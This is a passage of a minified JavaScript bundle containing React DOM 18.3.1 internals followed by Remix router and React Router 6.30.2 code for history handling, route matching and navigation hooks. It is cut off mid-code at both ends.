1:n=pc(null,n,s,e,t);break e;case 11:n=cc(null,n,s,e,t);break e;case 14:n=uc(null,n,s,Ve(s.type,e),t);break e}throw Error(A(306,s,""))}return n;case 0:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Ve(s,r),ja(e,n,s,r,t);case 1:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Ve(s,r),pc(e,n,s,r,t);case 3:e:{if(Wp(n),e===null)throw Error(A(387));s=n.pendingProps,i=n.memoizedState,r=i.element,yp(e,n),Gr(n,s,null,t);var a=n.memoizedState;if(s=a.element,i.isDehydrated)if(i={element:s,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},n.updateQueue.baseState=i,n.memoizedState=i,n.flags&256){r=Dt(Error(A(423)),n),n=dc(e,n,s,t,r);break e}else if(s!==r){r=Dt(Error(A(424)),n),n=dc(e,n,s,t,r);break e}else for(Ae=On(n.stateNode.containerInfo.firstChild),Le=n,q=!0,$e=null,t=mp(n,null,s,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(Mt(),s===r){n=gn(e,n,t);break e}ve(e,n,s,t)}n=n.child}return n;case 5:return vp(n),e===null&&Oa(n),s=n.type,r=n.pendingProps,i=e!==null?e.memoizedProps:null,a=r.children,Pa(s,r)?a=null:i!==null&&Pa(s,i)&&(n.flags|=32),Vp(e,n),ve(e,n,a,t),n.child;case 6:return e===null&&Oa(n),null;case 13:return $p(e,n,t);case 4:return Dl(n,n.stateNode.containerInfo),s=n.pendingProps,e===null?n.child=It(n,null,s,t):ve(e,n,s,t),n.child;case 11:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Ve(s,r),cc(e,n,s,r,t);case 7:return ve(e,n,n.pendingProps,t),n.child;case 8:return ve(e,n,n.pendingProps.children,t),n.child;case 12:return ve(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(s=n.type._context,r=n.pendingProps,i=n.memoizedProps,a=r.value,V(Wr,s._currentValue),s._currentValue=a,i!==null)if(Xe(i.value,a)){if(i.children===r.children&&!Ee.current){n=gn(e,n,t);break e}}else for(i=n.child,i!==null&&(i.return=n);i!==null;){var l=i.dependencies;if(l!==null){a=i.child;for(var o=l.firstContext;o!==null;){if(o.context===s){if(i.tag===1){o=dn(-1,t&-t),o.tag=2;var c=i.updateQueue;if(c!==null){c=c.shared;var u=c.pending;u===null?o.next=o:(o.next=u.next,u.next=o),c.pending=o}}i.lanes|=t,o=i.alternate,o!==null&&(o.lanes|=t),Ma(i.return,t,n),l.lanes|=t;break}o=o.next}}else if(i.tag===10)a=i.type===n.type?null:i.child;else if(i.tag===18){if(a=i.return,a===null)throw Error(A(341));a.lanes|=t,l=a.alternate,l!==null&&(l.lanes|=t),Ma(a,t,n),a=i.sibling}else a=i.child;if(a!==null)a.return=i;else for(a=i;a!==null;){if(a===n){a=null;break}if(i=a.sibling,i!==null){i.return=a.return,a=i;break}a=a.return}i=a}ve(e,n,r.children,t),n=n.child}return n;case 9:return r=n.type,s=n.pendingProps.children,Pt(n,t),r=Fe(r),s=s(r),n.flags|=1,ve(e,n,s,t),n.child;case 14:return s=n.type,r=Ve(s,n.pendingProps),r=Ve(s.type,r),uc(e,n,s,r,t);case 15:return Up(e,n,n.type,n.pendingProps,t);case 17:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Ve(s,r),Sr(e,n),n.tag=1,Te(s)?(e=!0,Ur(n)):e=!1,Pt(n,t),jp(n,s,r),za(n,s,r,t),Ba(null,n,s,!0,e,t);case 19:return Gp(e,n,t);case 22:return Hp(e,n,t)}throw Error(A(156,n.tag))};function od(e,n){return Iu(e,n)}function vm(e,n,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function je(e,n,t,s){return new vm(e,n,t,s)}function Zl(e){return e=e.prototype,!(!e||!e.isReactComponent)}function wm(e){if(typeof e=="function")return Zl(e)?1:0;if(e!=null){if(e=e.$$typeof,e===yl)return 11;if(e===vl)return 14}return 2}function Dn(e,n){var t=e.alternate;return t===null?(t=je(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Tr(e,n,t,s,r,i){var a=2;if(s=e,typeof e=="function")Zl(e)&&(a=1);else if(typeof e=="string")a=5;else e:switch(e){case dt:return Jn(t.children,r,i,n);case gl:a=8,r|=8;break;case aa:return e=je(12,t,n,r|2),e.elementType=aa,e.lanes=i,e;case la:return e=je(13,t,n,r),e.elementType=la,e.lanes=i,e;case oa:return e=je(19,t,n,r),e.elementType=oa,e.lanes=i,e;case vu:return wi(t,r,i,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case gu:a=10;break e;case yu:a=9;break e;case yl:a=11;break e;case vl:a=14;break e;case bn:a=16,s=null;break e}throw Error(A(130,e==null?e:typeof e,""))}return n=je(a,t,n,r),n.elementType=e,n.type=s,n.lanes=i,n}function Jn(e,n,t,s){return e=je(7,e,s,n),e.lanes=t,e}function wi(e,n,t,s){return e=je(22,e,s,n),e.elementType=vu,e.lanes=t,e.stateNode={isHidden:!1},e}function Ji(e,n,t){return e=je(6,e,null,n),e.lanes=t,e}function ea(e,n,t){return n=je(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function km(e,n,t,s,r){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Mi(0),this.expirationTimes=Mi(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Mi(0),this.identifierPrefix=s,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function Jl(e,n,t,s,r,i,a,l,o){return e=new km(e,n,t,l,o),n===1?(n=1,i===!0&&(n|=8)):n=0,i=je(3,null,null,n),e.current=i,i.stateNode=e,i.memoizedState={element:s,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},zl(i),e}function bm(e,n,t){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:pt,key:s==null?null:""+s,children:e,containerInfo:n,implementation:t}}function cd(e){if(!e)return Fn;e=e._reactInternals;e:{if(ot(e)!==e||e.tag!==1)throw Error(A(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(Te(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(A(171))}if(e.tag===1){var t=e.type;if(Te(t))return cp(e,t,n)}return n}function ud(e,n,t,s,r,i,a,l,o){return e=Jl(t,s,!0,e,r,i,a,l,o),e.context=cd(null),t=e.current,s=we(),r=zn(t),i=dn(s,r),i.callback=n??null,Mn(t,i,r),e.current.lanes=r,Fs(e,r,s),Ce(e,s),e}function ki(e,n,t,s){var r=n.current,i=we(),a=zn(r);return t=cd(t),n.context===null?n.context=t:n.pendingContext=t,n=dn(i,a),n.payload={element:e},s=s===void 0?null:s,s!==null&&(n.callback=s),e=Mn(r,n,a),e!==null&&(Ye(e,r,a,i),kr(e,r,a)),a}function ei(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function xc(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function eo(e,n){xc(e,n),(e=e.alternate)&&xc(e,n)}function xm(){return null}var pd=typeof reportError=="function"?reportError:function(e){console.error(e)};function no(e){this._internalRoot=e}bi.prototype.render=no.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(A(409));ki(e,n,null,null)};bi.prototype.unmount=no.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;it(function(){ki(null,e,null,null)}),n[fn]=null}};function bi(e){this._internalRoot=e}bi.prototype.unstable_scheduleHydration=function(e){if(e){var n=Hu();e={blockedOn:null,target:e,priority:n};for(var t=0;t<_n.length&&n!==0&&n<_n[t].priority;t++);_n.splice(t,0,e),t===0&&Wu(e)}};function to(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function xi(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Sc(){}function Sm(e,n,t,s,r){if(r){if(typeof s=="function"){var i=s;s=function(){var c=ei(a);i.call(c)}}var a=ud(n,s,e,0,null,!1,!1,"",Sc);return e._reactRootContainer=a,e[fn]=a.current,_s(e.nodeType===8?e.parentNode:e),it(),a}for(;r=e.lastChild;)e.removeChild(r);if(typeof s=="function"){var l=s;s=function(){var c=ei(o);l.call(c)}}var o=Jl(e,0,!1,null,null,!1,!1,"",Sc);return e._reactRootContainer=o,e[fn]=o.current,_s(e.nodeType===8?e.parentNode:e),it(function(){ki(n,o,t,s)}),o}function Si(e,n,t,s,r){var i=t._reactRootContainer;if(i){var a=i;if(typeof r=="function"){var l=r;r=function(){var o=ei(a);l.call(o)}}ki(n,a,e,r)}else a=Sm(t,n,e,r,s);return ei(a)}Fu=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=ss(n.pendingLanes);t!==0&&(bl(n,t|1),Ce(n,J()),!(U&6)&&(jt=J()+500,Vn()))}break;case 13:it(function(){var s=mn(e,1);if(s!==null){var r=we();Ye(s,e,1,r)}}),eo(e,1)}};xl=function(e){if(e.tag===13){var n=mn(e,134217728);if(n!==null){var t=we();Ye(n,e,134217728,t)}eo(e,134217728)}};Uu=function(e){if(e.tag===13){var n=zn(e),t=mn(e,n);if(t!==null){var s=we();Ye(t,e,n,s)}eo(e,n)}};Hu=function(){return H};Vu=function(e,n){var t=H;try{return H=e,n()}finally{H=t}};va=function(e,n,t){switch(n){case"input":if(pa(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var s=t[n];if(s!==e&&s.form===e.form){var r=hi(s);if(!r)throw Error(A(90));ku(s),pa(s,r)}}}break;case"textarea":xu(e,t);break;case"select":n=t.value,n!=null&&_t(e,!!t.multiple,n,!1)}};Au=Xl;Lu=it;var _m={usingClientEntryPoint:!1,Events:[Hs,gt,hi,Cu,Pu,Xl]},Zt={findFiberByHostInstance:Yn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Em={bundleType:Zt.bundleType,version:Zt.version,rendererPackageName:Zt.rendererPackageName,rendererConfig:Zt.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:vn.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Ou(e),e===null?null:e.stateNode},findFiberByHostInstance:Zt.findFiberByHostInstance||xm,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var ur=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!ur.isDisabled&&ur.supportsFiber)try{ci=ur.inject(Em),en=ur}catch{}}Oe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=_m;Oe.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!to(n))throw Error(A(200));return bm(e,n,null,t)};Oe.createRoot=function(e,n){if(!to(e))throw Error(A(299));var t=!1,s="",r=pd;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(r=n.onRecoverableError)),n=Jl(e,1,!1,null,null,t,!1,s,r),e[fn]=n.current,_s(e.nodeType===8?e.parentNode:e),new no(n)};Oe.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(A(188)):(e=Object.keys(e).join(","),Error(A(268,e)));return e=Ou(n),e=e===null?null:e.stateNode,e};Oe.flushSync=function(e){return it(e)};Oe.hydrate=function(e,n,t){if(!xi(n))throw Error(A(200));return Si(null,e,n,!0,t)};Oe.hydrateRoot=function(e,n,t){if(!to(e))throw Error(A(405));var s=t!=null&&t.hydratedSources||null,r=!1,i="",a=pd;if(t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(i=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),n=ud(n,null,e,1,t??null,r,!1,i,a),e[fn]=n.current,_s(e),s)for(e=0;e<s.length;e++)t=s[e],r=t._getVersion,r=r(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,r]:n.mutableSourceEagerHydrationData.push(t,r);return new bi(n)};Oe.render=function(e,n,t){if(!xi(n))throw Error(A(200));return Si(null,e,n,!1,t)};Oe.unmountComponentAtNode=function(e){if(!xi(e))throw Error(A(40));return e._reactRootContainer?(it(function(){Si(null,null,e,!1,function(){e._reactRootContainer=null,e[fn]=null})}),!0):!1};Oe.unstable_batchedUpdates=Xl;Oe.unstable_renderSubtreeIntoContainer=function(e,n,t,s){if(!xi(t))throw Error(A(200));if(e==null||e._reactInternals===void 0)throw Error(A(38));return Si(e,n,t,!1,s)};Oe.version="18.3.1-next-f1338f8080-20240426";function dd(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(dd)}catch(e){console.error(e)}}dd(),du.exports=Oe;var Tm=du.exports,hd,_c=Tm;hd=_c.createRoot,_c.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Os(){return Os=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Os.apply(this,arguments)}var An;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(An||(An={}));const Ec="popstate";function Cm(e){e===void 0&&(e={});function n(s,r){let{pathname:i,search:a,hash:l}=s.location;return Qa("",{pathname:i,search:a,hash:l},r.state&&r.state.usr||null,r.state&&r.state.key||"default")}function t(s,r){return typeof r=="string"?r:ni(r)}return Am(n,t,null,e)}function ne(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function so(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function Pm(){return Math.random().toString(36).substr(2,8)}function Tc(e,n){return{usr:e.state,key:e.key,idx:n}}function Qa(e,n,t,s){return t===void 0&&(t=null),Os({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?Wt(n):n,{state:t,key:n&&n.key||s||Pm()})}function ni(e){let{pathname:n="/",search:t="",hash:s=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),s&&s!=="#"&&(n+=s.charAt(0)==="#"?s:"#"+s),n}function Wt(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let s=e.indexOf("?");s>=0&&(n.search=e.substr(s),e=e.substr(0,s)),e&&(n.pathname=e)}return n}function Am(e,n,t,s){s===void 0&&(s={});let{window:r=document.defaultView,v5Compat:i=!1}=s,a=r.history,l=An.Pop,o=null,c=u();c==null&&(c=0,a.replaceState(Os({},a.state,{idx:c}),""));function u(){return(a.state||{idx:null}).idx}function h(){l=An.Pop;let x=u(),p=x==null?null:x-c;c=x,o&&o({action:l,location:g.location,delta:p})}function f(x,p){l=An.Push;let d=Qa(g.location,x,p);c=u()+1;let m=Tc(d,c),w=g.createHref(d);try{a.pushState(m,"",w)}catch(S){if(S instanceof DOMException&&S.name==="DataCloneError")throw S;r.location.assign(w)}i&&o&&o({action:l,location:g.location,delta:1})}function v(x,p){l=An.Replace;let d=Qa(g.location,x,p);c=u();let m=Tc(d,c),w=g.createHref(d);a.replaceState(m,"",w),i&&o&&o({action:l,location:g.location,delta:0})}function b(x){let p=r.location.origin!=="null"?r.location.origin:r.location.href,d=typeof x=="string"?x:ni(x);return d=d.replace(/ $/,"%20"),ne(p,"No window.location.(origin|href) available to create URL for href: "+d),new URL(d,p)}let g={get action(){return l},get location(){return e(r,a)},listen(x){if(o)throw new Error("A history only accepts one active listener");return r.addEventListener(Ec,h),o=x,()=>{r.removeEventListener(Ec,h),o=null}},createHref(x){return n(r,x)},createURL:b,encodeLocation(x){let p=b(x);return{pathname:p.pathname,search:p.search,hash:p.hash}},push:f,replace:v,go(x){return a.go(x)}};return g}var Cc;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(Cc||(Cc={}));function Lm(e,n,t){return t===void 0&&(t="/"),Nm(e,n,t)}function Nm(e,n,t,s){let r=typeof n=="string"?Wt(n):n,i=ro(r.pathname||"/",t);if(i==null)return null;let a=fd(e);Rm(a);let l=null;for(let o=0;l==null&&o<a.length;++o){let c=Wm(i);l=Um(a[o],c)}return l}function fd(e,n,t,s){n===void 0&&(n=[]),t===void 0&&(t=[]),s===void 0&&(s="");let r=(i,a,l)=>{let o={relativePath:l===void 0?i.path||"":l,caseSensitive:i.caseSensitive===!0,childrenIndex:a,route:i};o.relativePath.startsWith("/")&&(ne(o.relativePath.startsWith(s),'Absolute route path "'+o.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),o.relativePath=o.relativePath.slice(s.length));let c=jn([s,o.relativePath]),u=t.concat(o);i.children&&i.children.length>0&&(ne(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),fd(i.children,n,u,c)),!(i.path==null&&!i.index)&&n.push({path:c,score:Bm(c,i.index),routesMeta:u})};return e.forEach((i,a)=>{var l;if(i.path===""||!((l=i.path)!=null&&l.includes("?")))r(i,a);else for(let o of md(i.path))r(i,a,o)}),n}function md(e){let n=e.split("/");if(n.length===0)return[];let[t,...s]=n,r=t.endsWith("?"),i=t.replace(/\?$/,"");if(s.length===0)return r?[i,""]:[i];let a=md(s.join("/")),l=[];return l.push(...a.map(o=>o===""?i:[i,o].join("/"))),r&&l.push(...a),l.map(o=>e.startsWith("/")&&o===""?"/":o)}function Rm(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Fm(n.routesMeta.map(s=>s.childrenIndex),t.routesMeta.map(s=>s.childrenIndex)))}const Om=/^:[\w-]+$/,Mm=3,Im=2,zm=1,Dm=10,jm=-2,Pc=e=>e==="*";function Bm(e,n){let t=e.split("/"),s=t.length;return t.some(Pc)&&(s+=jm),n&&(s+=Im),t.filter(r=>!Pc(r)).reduce((r,i)=>r+(Om.test(i)?Mm:i===""?zm:Dm),s)}function Fm(e,n){return e.length===n.length&&e.slice(0,-1).every((s,r)=>s===n[r])?e[e.length-1]-n[n.length-1]:0}function Um(e,n,t){let{routesMeta:s}=e,r={},i="/",a=[];for(let l=0;l<s.length;++l){let o=s[l],c=l===s.length-1,u=i==="/"?n:n.slice(i.length)||"/",h=Hm({path:o.relativePath,caseSensitive:o.caseSensitive,end:c},u),f=o.route;if(!h)return null;Object.assign(r,h.params),a.push({params:r,pathname:jn([i,h.pathname]),pathnameBase:Xm(jn([i,h.pathnameBase])),route:f}),h.pathnameBase!=="/"&&(i=jn([i,h.pathnameBase]))}return a}function Hm(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,s]=Vm(e.path,e.caseSensitive,e.end),r=n.match(t);if(!r)return null;let i=r[0],a=i.replace(/(.)\/+$/,"$1"),l=r.slice(1);return{params:s.reduce((c,u,h)=>{let{paramName:f,isOptional:v}=u;if(f==="*"){let g=l[h]||"";a=i.slice(0,i.length-g.length).replace(/(.)\/+$/,"$1")}const b=l[h];return v&&!b?c[f]=void 0:c[f]=(b||"").replace(/%2F/g,"/"),c},{}),pathname:i,pathnameBase:a,pattern:e}}function Vm(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),so(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],r="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,l,o)=>(s.push({paramName:l,isOptional:o!=null}),o?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),r+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?r+="\\/*$":e!==""&&e!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,n?void 0:"i"),s]}function Wm(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return so(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function ro(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,s=e.charAt(t);return s&&s!=="/"?null:e.slice(t)||"/"}const $m=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Gm=e=>$m.test(e);function qm(e,n){n===void 0&&(n="/");let{pathname:t,search:s="",hash:r=""}=typeof e=="string"?Wt(e):e,i;if(t)if(Gm(t))i=t;else{if(t.includes("//")){let a=t;t=t.replace(/\/\/+/g,"/"),so(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+t))}t.startsWith("/")?i=Ac(t.substring(1),"/"):i=Ac(t,n)}else i=n;return{pathname:i,search:Km(s),hash:Qm(r)}}function Ac(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(r=>{r===".."?t.length>1&&t.pop():r!=="."&&t.push(r)}),t.length>1?t.join("/"):"/"}function na(e,n,t,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function Ym(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function gd(e,n){let t=Ym(e);return n?t.map((s,r)=>r===t.length-1?s.pathname:s.pathnameBase):t.map(s=>s.pathnameBase)}function yd(e,n,t,s){s===void 0&&(s=!1);let r;typeof e=="string"?r=Wt(e):(r=Os({},e),ne(!r.pathname||!r.pathname.includes("?"),na("?","pathname","search",r)),ne(!r.pathname||!r.pathname.includes("#"),na("#","pathname","hash",r)),ne(!r.search||!r.search.includes("#"),na("#","search","hash",r)));let i=e===""||r.pathname==="",a=i?"/":r.pathname,l;if(a==null)l=t;else{let h=n.length-1;if(!s&&a.startsWith("..")){let f=a.split("/");for(;f[0]==="..";)f.shift(),h-=1;r.pathname=f.join("/")}l=h>=0?n[h]:"/"}let o=qm(r,l),c=a&&a!=="/"&&a.endsWith("/"),u=(i||a===".")&&t.endsWith("/");return!o.pathname.endsWith("/")&&(c||u)&&(o.pathname+="/"),o}const jn=e=>e.join("/").replace(/\/\/+/g,"/"),Xm=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),Km=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,Qm=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function Zm(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const vd=["post","put","patch","delete"];new Set(vd);const Jm=["get",...vd];new Set(Jm);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ms(){return Ms=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ms.apply(this,arguments)}const io=E.createContext(null),eg=E.createContext(null),ct=E.createContext(null),_i=E.createContext(null),Wn=E.createContext({outlet:null,matches:[],isDataRoute:!1}),wd=E.createContext(null);function ng(e,n){let{relative:t}=n===void 0?{}:n;Ws()||ne(!1);let{basename:s,navigator:r}=E.useContext(ct),{hash:i,pathname:a,search:l}=xd(e,{relative:t}),o=a;return s!=="/"&&(o=a==="/"?s:jn([s,a])),r.createHref({pathname:o,search:l,hash:i})}function Ws(){return E.useContext(_i)!=null}function $s(){return Ws()||ne(!1),E.useContext(_i).location}function kd(e){E.useContext(ct).static||E.useLayoutEffect(e)}function bd(){let{isDataRoute:e}=E.useContext(Wn);return e?mg():tg()}function tg(){Ws()||ne(!1);let e=E.useContext(io),{basename:n,future:t,navigator:s}=E.useContext(ct),{matches:r}=E.useContext(Wn),{pathname:i}=$s(),a=JSON.stringify(gd(r,t.v7_relativeSplatPath)),l=E.useRef(!1);return kd(()=>{l.current=!0}),E.useCallback(function(c,u){if(u===void 0&&(u={}),!l.current)return;if(typeof c=="number"){s.go(c);return}let h=yd(c,JSON.parse(a),i,u.relative==="path");e==null&&n!=="/"&&(h.pathname=h.pathname==="/"?n:jn([n,h.pathname])),(u.replace?s.replace:s.push)(h,u.state,u)},[n,s,a,i,e])}function sg(){let{matches:e}=E.useContext(Wn),n=e[e.length-1];return n?n.params:{}}function xd(e,n){let{relative:t}=n===void 0?{}:n,{future:s}=E.useContext(ct),{matches:r}=E.useContext(Wn),{pathname:i}=$s(),a=JSON.stringify(gd(r,s.v7_relativeSplatPath));return E.useMemo(()=>yd(e,JSON.parse(a),i,t==="path"),[e,a,i,t])}function rg(e,n){return ig(e,n)}function ig(e,n,t,s){Ws()||ne(!1);let{navigator:r}=E.useContext(ct),{matches:i}=E.useContext(Wn),a=i[i.length-1],l=a?a.params:{};a&&a.pathname;let o=a?a.pathnameBase:"/";a&&a.route;let c=$s(),u;if(n){var h;let x=typeof n=="string"?Wt(n):n;o==="/"||(h=x.pathname)!=null&&h.startsWith(o)||ne(!1),u=x}else u=c;let f=u.pathname||"/",v=f;if(o!=="/"){let x=o.replace(/^\//,"").split("/");v="/"+f.replace(/^\//,"").split("/").slice(x.length).join("/")}let b=Lm(e,{pathname:v}),g=ug(b&&b.map(x=>Object.assign({},x,{params:Object.assign({},l,x.params),pathname:jn([o,r.encodeLocation?r.encodeLocation(x.pathname).pathname:x.pathname]),pathnameBase:x.pathnameBase==="/"?o:jn([o,r.encodeLocation?r.encodeLocation(x.pathnameBase).pathname:x.pathnameBase])})),i,t,s);return n&&g?E.createElement(_i.Provider,{value:{location:Ms({pathname:"/",search:"",hash:"",state:null,key:"default"},u),navigationType:An.Pop}},g):g}function ag(){let e=fg(),n=Zm(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,r={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return E.createElement(E.Fragment,null,E.createElement("h2",null,"Unexpected Application Error!"),E.createElement("h3",{style:{fontStyle:"italic"}},n),t?E.createElement("pre",{style:r},t):null,null)}const lg=E.createElement(ag,null);class og extends E.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?E.createElement(Wn.Provider,{value:this.props.routeContext},E.createElement(wd.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function cg(e){let{routeContext:n,match:t,children:s}=e,r=E.useContext(io);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),E.createElement(Wn.Provider,{value:n},s)}function ug(e,n,t,s){var r;if(n===void 0&&(n=[]),t===void 0&&(t=null),s===void 0&&(s=null),e==null){var i;if(!t)return null;if(t.errors)e=t.matches;else 